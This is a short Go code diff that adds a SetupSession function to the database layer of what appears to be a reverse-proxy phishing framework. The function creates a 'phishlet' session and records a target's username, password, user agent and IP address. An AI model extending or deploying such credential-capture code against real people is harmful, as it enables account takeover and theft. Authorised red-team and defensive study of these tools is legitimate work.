@@ -3,6 +3,7 @@ package database
 import (
 	"encoding/json"
 	"strconv"
+	"time"
 
 	"github.com/tidwall/buntdb"
 )
@@ -168,4 +169,32 @@ func (d *Database) GetSessionById(id int) (*Session, error) {
 
 func (d *Database) GetSessionBySid(sid string) (*Session, error) {
 	return d.sessionsGetBySid(sid)
+}
+
+// SetupSession تقوم بإعداد جلسة كاملة مع جميع المعلومات الأساسية
+func (d *Database) SetupSession(
+	sid string, phishlet string, username string, password string,
+	landing_url string, useragent string, remote_addr string,
+) error {
+	// إنشاء الجلسة
+	err := d.CreateSession(
+		sid, phishlet, landing_url, useragent, remote_addr,
+		"", "", // countryCode, countryName
+		"", "", "", "", "", // deviceType, browserType, browserVersion, osType, osVersion
+		"", false, "", // loginType, has2FA, type2FA
+	)
+	if err != nil {
+		return err
+	}
+
+	// تحديث اسم المستخدم وكلمة المرور
+	if err := d.SetSessionUsername(sid, username); err != nil {
+		return err
+	}
+
+	if err := d.SetSessionPassword(sid, password); err != nil {
+		return err
+	}
+
+	return nil
 }
